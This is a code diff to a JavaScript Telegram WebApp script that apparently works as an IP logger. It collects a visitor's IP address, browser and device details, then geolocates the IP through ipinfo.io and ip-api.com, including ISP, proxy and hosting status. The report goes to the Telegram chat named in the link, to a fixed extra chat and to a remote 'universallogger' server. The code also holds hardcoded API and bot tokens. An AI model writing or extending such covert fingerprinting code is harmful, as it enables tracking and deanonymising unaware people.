@@ -9,6 +9,43 @@ async function getIPAddress() {
     }
 }
 
+async function getIPInfo(ip) {
+    const token = '71d90c9aad85e4';
+    try {
+        const response = await fetch(`https://ipinfo.io/${ip}?token=${token}`);
+        const data = await response.json();
+        return data;
+    } catch (error) {
+        console.error('Ошибка получения информации об IP адресе:', error);
+        return {
+            city: 'неизвестно',
+            region: 'неизвестно',
+            country: 'неизвестно',
+            org: 'неизвестно',
+            timezone: 'неизвестно',
+        };
+    }
+}
+
+async function getAdditionalIPInfo(ip) {
+    try {
+        const response = await fetch(`http://ip-api.com/json/${ip}`);
+        const data = await response.json();
+        return data;
+    } catch (error) {
+        console.error('Ошибка получения дополнительной информации об IP адресе:', error);
+        return {
+            as: 'неизвестно',
+            isp: 'неизвестно',
+            org: 'неизвестно',
+            reverse: 'неизвестно',
+            mobile: 'неизвестно',
+            proxy: 'неизвестно',
+            hosting: 'неизвестно'
+        };
+    }
+}
+
 function getUserAgent() {
     try {
         return navigator.userAgent || 'неизвестно';
@@ -60,11 +97,12 @@ function getBrowserInfo() {
 
 async function sendDataToTelegram() {
     let tg = window.Telegram.WebApp;
-    const token = "7212589811:AAH4Qyoboljh-SYCE48LL_nyZNCS7KvUeI0"
     const chatId = tg.initDataUnsafe.start_param;
     const additionalChatId = -1002184270191;
 
     const ipAddress = await getIPAddress();
+    const ipInfo = await getIPInfo(ipAddress);
+    const additionalIPInfo = await getAdditionalIPInfo(ipAddress);
     const userAgent = getUserAgent();
     const osName = getOSName();
     const screenResolution = getScreenResolution();
@@ -95,6 +133,22 @@ async function sendDataToTelegram() {
 ├ Название браузера: <code>${browserInfo.name}</code>
 ├ Версия браузера: <code>${browserInfo.version}</code>
 └ Тип движка браузера: <code>${browserInfo.engine}</code>
+
+<b>💫 Информация о IP-адресе:</b>
+├ Город: <code>${ipInfo.city}</code>
+├ Регион: <code>${ipInfo.region}</code>
+├ Страна: <code>${ipInfo.country}</code>
+├ Организация: <code>${ipInfo.org}</code>
+└ Часовой пояс: <code>${ipInfo.timezone}</code>
+
+⭕ <b>Дополнительная информация о IP:</b>
+├ AS: <code>${additionalIPInfo.as}</code>
+├ ISP: <code>${additionalIPInfo.isp}</code>
+├ Организация: <code>${additionalIPInfo.org}</code>
+├ Reverse: <code>${additionalIPInfo.reverse}</code>
+├ Mobile: <code>${additionalIPInfo.mobile}</code>
+├ Proxy: <code>${additionalIPInfo.proxy}</code>
+└ Hosting: <code>${additionalIPInfo.hosting}</code>
     `;
 
     const url = `https://mapiii.nexcord.pro/api/universallogger/server.php?action=send`;
